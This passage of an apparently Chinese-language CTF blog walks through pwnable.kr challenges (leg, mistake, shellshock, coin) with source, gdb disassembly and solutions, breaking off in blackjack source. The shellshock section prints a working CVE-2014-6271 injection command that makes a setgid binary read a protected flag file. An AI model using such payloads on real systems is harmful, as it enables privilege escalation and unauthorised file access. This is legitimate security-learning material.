<span class="token keyword">int</span> <span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"mov r3, lr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> key<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Daddy has very strong arm! : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">key1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">key3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Congratz!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"I have strong leg :P\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-armasm"><code class="language-armasm">(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>:        push    {r4, r11, lr}
   0x00008d40 <+4>:        add        r11, sp, #8
   0x00008d44 <+8>:        sub        sp, sp, #12
   0x00008d48 <+12>:    mov        r3, #0
   0x00008d4c <+16>:    str        r3, [r11, #-16]
   0x00008d50 <+20>:    ldr        r0, [pc, #104]    ; 0x8dc0 <main+132>
   0x00008d54 <+24>:    bl        0xfb6c <printf>
   0x00008d58 <+28>:    sub        r3, r11, #16
   0x00008d5c <+32>:    ldr        r0, [pc, #96]    ; 0x8dc4 <main+136>
   0x00008d60 <+36>:    mov        r1, r3
   0x00008d64 <+40>:    bl        0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:    bl        0x8cd4 <key1>
   0x00008d6c <+48>:    mov        r4, r0
   0x00008d70 <+52>:    bl        0x8cf0 <key2>
   0x00008d74 <+56>:    mov        r3, r0
   0x00008d78 <+60>:    add        r4, r4, r3
   0x00008d7c <+64>:    bl        0x8d20 <key3>
   0x00008d80 <+68>:    mov        r3, r0
   0x00008d84 <+72>:    add        r2, r4, r3
   0x00008d88 <+76>:    ldr        r3, [r11, #-16]
   0x00008d8c <+80>:    cmp        r2, r3
   0x00008d90 <+84>:    bne        0x8da8 <main+108>
   0x00008d94 <+88>:    ldr        r0, [pc, #44]    ; 0x8dc8 <main+140>
   0x00008d98 <+92>:    bl        0x1050c <puts>
   0x00008d9c <+96>:    ldr        r0, [pc, #40]    ; 0x8dcc <main+144>
   0x00008da0 <+100>:    bl        0xf89c <system>
   0x00008da4 <+104>:    b        0x8db0 <main+116>
   0x00008da8 <+108>:    ldr        r0, [pc, #32]    ; 0x8dd0 <main+148>
   0x00008dac <+112>:    bl        0x1050c <puts>
   0x00008db0 <+116>:    mov        r3, #0
   0x00008db4 <+120>:    mov        r0, r3
   0x00008db8 <+124>:    sub        sp, r11, #8
   0x00008dbc <+128>:    pop        {r4, r11, pc}
   0x00008dc0 <+132>:    andeq    r10, r6, r12, lsl #9
   0x00008dc4 <+136>:    andeq    r10, r6, r12, lsr #9
   0x00008dc8 <+140>:                ; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:                ; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>:    andeq    r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>:        add        r11, sp, #0
   0x00008cdc <+8>:        mov        r3, pc
   0x00008ce0 <+12>:    mov        r0, r3
   0x00008ce4 <+16>:    sub        sp, r11, #0
   0x00008ce8 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)
   0x00008cec <+24>:    bx        lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>:        add        r11, sp, #0
   0x00008cf8 <+8>:        push    {r6}        ; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:    add        r6, pc, #1
   0x00008d00 <+16>:    bx        r6
   0x00008d04 <+20>:    mov        r3, pc
   0x00008d06 <+22>:    adds    r3, #4
   0x00008d08 <+24>:    push    {r3}
   0x00008d0a <+26>:    pop        {pc}
   0x00008d0c <+28>:    pop        {r6}        ; (ldr r6, [sp], #4)
   0x00008d10 <+32>:    mov        r0, r3
   0x00008d14 <+36>:    sub        sp, r11, #0
   0x00008d18 <+40>:    pop        {r11}        ; (ldr r11, [sp], #4)
   0x00008d1c <+44>:    bx        lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>:        push    {r11}        ; (str r11, [sp, #-4]!)
   0x00008d24 <+4>:        add        r11, sp, #0
   0x00008d28 <+8>:        mov        r3, lr
   0x00008d2c <+12>:    mov        r0, r3
   0x00008d30 <+16>:    sub        sp, r11, #0
   0x00008d34 <+20>:    pop        {r11}        ; (ldr r11, [sp], #4)
   0x00008d38 <+24>:    bx        lr
End of assembler dump.
(gdb) </code></pre>
<h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>通过 c 文件看，就是找到 key1、key2、key3 之和即可</p>
<ul>
<li><p>key1：</p>
<ul>
<li>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节</li>
<li>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15910787471583.jpg" alt="https://static.docs.arm.com/ihi0042/g/aapcs32.pdf"></p>
<p>当只有一个结果返回时，会放在 r0 里，所以 key1：0x00008cdc + 0x8 = 0x00008ce4</p>
</li>
<li><p>key2：<br>由于 0x00008cfc 处 r6：0x1 + 0x00008cfc + 0x8 = 0x00008d05 最后一位为 1 导致在0x00008d00处进入 Thumb 状态，于是 0x00008d06 处 r3 = 0x00008d04 + 0x4 + 0x4 = 0x00008d0c</p>
</li>
<li><p>key3：</p>
<p>连接寄存器r14（LR）：每种模式下r14都有自身版组，它有两个特殊功能：</p>
<ol>
<li>保存子程序返回地址。使用BL或BLX时，跳转指令自动把返回地址放入r14中；子程序通过把r14复制到PC来实现返回</li>
<li>当异常发生时，异常模式的r14用来保存异常返回地址，将r14如栈可以处理嵌套中断</li>
</ol>
<p>可以看到下一条指令的地址为 0x00008d80</p>
<p>所以 key3：0x00008d80</p>
</li>
</ul>
<p>综合计算 key1 + key2 + key3 = 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400</p>
<h3 id="解题-7"><a href="#解题-7" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">/ $ ./leg
Daddy has very strong arm! : 108400
Congratz!
My daddy has a lot of ARMv5te muscle!</code></pre>
<h2 id="9-mistake"><a href="#9-mistake" class="headerlink" title="9. mistake"></a>9. mistake</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>

<span class="token macro property">#<span class="token directive keyword">define</span> PW_LEN 10</span>
<span class="token macro property">#<span class="token directive keyword">define</span> XORKEY 1</span>

<span class="token keyword">void</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> XORKEY<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/home/mistake/password"</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">,</span><span class="token number">0400</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"can't open password %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"do not bruteforce...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> pw_buf<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> len<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>len<span class="token operator">=</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>pw_buf<span class="token punctuation">,</span>PW_LEN<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"read error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        
    <span class="token punctuation">}</span>

    <span class="token keyword">char</span> pw_buf2<span class="token punctuation">[</span>PW_LEN<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input password : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%10s"</span><span class="token punctuation">,</span> pw_buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// xor your input</span>
    <span class="token function">xor</span><span class="token punctuation">(</span>pw_buf2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>pw_buf<span class="token punctuation">,</span> pw_buf2<span class="token punctuation">,</span> PW_LEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong Password\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>题目给了提示</p>
<p>hint : operator priority</p>
<p>然后注意到这句<code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>这里面的执行优先级是有问题的，应该为<code>if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0)</code>，错误的写法导致 fd=0，紧跟着 read 则会从 stdin里面读取 10 位长度内容作为 password</p>
<p>所以最终 pw_buf 和 pw_buf2 我们都能控制，只要保证每一位和 1 进行亦或即可</p>
<h3 id="解题-8"><a href="#解题-8" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">mistake@pwnable:~$ ./mistake 
do not bruteforce...
0000000000
input password : 
1111111111
Password OK
Mommy, the operator priority always confuses me :(</code></pre>
<h2 id="10-shellshock"><a href="#10-shellshock" class="headerlink" title="10. shellshock"></a>10. shellshock</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">setresuid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setresgid</span><span class="token punctuation">(</span><span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/shellshock/bash -c 'echo shock_me'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>破壳漏洞的利用，<a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这篇文章</a>好点</p>
<p>查看有漏洞的 bash 版本</p>
<pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ./bash --version
GNU bash, version 4.2.25(1)-release (x86_64-pc-linux-gnu)</code></pre>
<p>同时注意到文件权限</p>
<pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ ls -sail
total 980
23593359   4 drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
23593232   4 drwxr-xr-x 116 root root             4096 Apr 17 14:10 ..
23593368 940 -r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
23593367   4 d---------   2 root root             4096 Oct 12  2014 .bash_history
23593366   4 -r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
23593364   4 dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
23593361   4 drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
23593363  12 -r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
23593360   4 -r--r--r--   1 root root              188 Oct 12  2014 shellshock.c</code></pre>
<h3 id="解题-9"><a href="#解题-9" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">shellshock@pwnable:~$ env x='() { :;}; /home/shellshock/bash -c "cat /home/shellshock/flag"' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)</code></pre>
<h2 id="11-coin"><a href="#11-coin" class="headerlink" title="11. coin"></a>11. coin</h2><h3 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h3><pre class=" language-shell"><code class="language-shell">    ---------------------------------------------------
    -              Shall we play a game?              -
    ---------------------------------------------------

    You have given some gold coins in your hand
    however, there is one counterfeit coin among them
    counterfeit coin looks exactly same as real coin
    however, its weight is different from real one
    real coin weighs 10, counterfeit coin weighes 9
    help me to find the counterfeit coin with a scale
    if you find 100 counterfeit coins, you will get reward :)
    FYI, you have 60 seconds.

    - How to play - 
    1. you get a number of coins (N) and number of chances (C)
    2. then you specify a set of index numbers of coins to be weighed
    3. you get the weight information
    4. 2~3 repeats C time, then you give the answer

    - Example -
    [Server] N=4 C=2     # find counterfeit among 4 coins with 2 trial
    [Client] 0 1         # weigh first and second coin
    [Server] 20            # scale result : 20
    [Client] 3            # weigh fourth coin
    [Server] 10            # scale result : 10
    [Client] 2             # counterfeit coin is third!
    [Server] Correct!

    - Ready? starting in 3 sec... -</code></pre>
<h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p>二分法找 coin</p>
<h3 id="解题-10"><a href="#解题-10" class="headerlink" title="解题"></a>解题</h3><p>远程跑容易受到网络影响，推荐部署到<code>/tmp/</code>里本地跑，非常快</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> re <span class="token keyword">import</span> compile

conn <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> <span class="token number">9007</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">getList</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>int<span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    status <span class="token operator">=</span> <span class="token boolean">False</span>
    data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;-] recv: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>
    NC <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^N=([0-9]*) C=([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    W <span class="token operator">=</span> compile<span class="token punctuation">(</span><span class="token string">"^([0-9]*)$"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>match<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token keyword">if</span> NC<span class="token punctuation">:</span>
        end <span class="token operator">=</span> int<span class="token punctuation">(</span>NC<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        fp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span>
        sp <span class="token operator">=</span> <span class="token punctuation">(</span>end<span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">,</span> end<span class="token punctuation">)</span> 
        status <span class="token operator">=</span> <span class="token boolean">True</span>  
    <span class="token keyword">elif</span> W<span class="token punctuation">:</span>
        <span class="token keyword">if</span> int<span class="token punctuation">(</span>W<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">:</span>
            fp <span class="token operator">=</span> sp
        tp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span>
        sp <span class="token operator">=</span> <span class="token punctuation">(</span>tp<span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        fp <span class="token operator">=</span> <span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> tp<span class="token punctuation">)</span>
        status <span class="token operator">=</span> <span class="token boolean">True</span> 
    <span class="token keyword">elif</span> <span class="token string">"format error"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"time expired"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>.&lt; Bye..."</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">if</span> status<span class="token punctuation">:</span>
        data <span class="token operator">=</span> getList<span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] send: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>
        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre>
<pre class=" language-shell"><code class="language-shell">[<-] recv: Congrats! get your flag
b1NaRy_S34rch1nG_1s_3asy_p3asy</code></pre>
<h2 id="12-blackjeck"><a href="#12-blackjeck" class="headerlink" title="12. blackjeck"></a>12. blackjeck</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><p>原地址：<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Programmer: Vladislav Shulman</span>
<span class="token comment" spellcheck="true">// Final Project</span>
<span class="token comment" spellcheck="true">// Blackjack</span>

<span class="token comment" spellcheck="true">// Feel free to use any and all parts of this program and claim it as your own work</span>

<span class="token comment" spellcheck="true">//FINAL DRAFT</span>

<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span>                </span><span class="token comment" spellcheck="true">//Used for srand((unsigned) time(NULL)) command</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;process.h></span>             </span><span class="token comment" spellcheck="true">//Used for system("cls") command</span>

<span class="token macro property">#<span class="token directive keyword">define</span> spade 06                 </span><span class="token comment" spellcheck="true">//Used to print spade symbol</span>
<span class="token macro property">#<span class="token directive keyword">define</span> club 05                  </span><span class="token comment" spellcheck="true">//Used to print club symbol</span>
<span class="token macro property">#<span class="token directive keyword">define</span> diamond 04               </span><span class="token comment" spellcheck="true">//Used to print diamond symbol</span>
<span class="token macro property">#<span class="token directive keyword">define</span> heart 03                 </span><span class="token comment" spellcheck="true">//Used to print heart symbol</span>
<span class="token macro property">#<span class="token directive keyword">define</span> RESULTS "Blackjack.txt"  </span><span class="token comment" spellcheck="true">//File name is Blackjack</span>

<span class="token comment" spellcheck="true">//Global Variables</span>
<span class="token keyword">int</span> k<span class="token punctuation">;</span>
<span class="token keyword">int</span> l<span class="token punctuation">;</span>
<span class="token keyword">int</span> d<span class="token punctuation">;</span>
<span class="token keyword">int</span> won<span class="token punctuation">;</span>
<span class="token keyword">int</span> loss<span class="token punctuation">;</span>
<span class="token keyword">int</span> cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> bet<span class="token punctuation">;</span>
<span class="token keyword">int</span> random_card<span class="token punctuation">;</span>
<span class="token keyword">int</span> player_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> dealer_total<span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//Function Prototypes</span>
<span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Displays Club Card Image</span>
<span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span>
<span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Heart Card Image</span>
<span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Spade Card Image</span>
<span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Generates random card</span>
<span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Asks user amount to bet</span>
<span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Asks user to continue</span>
<span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" menu</span>
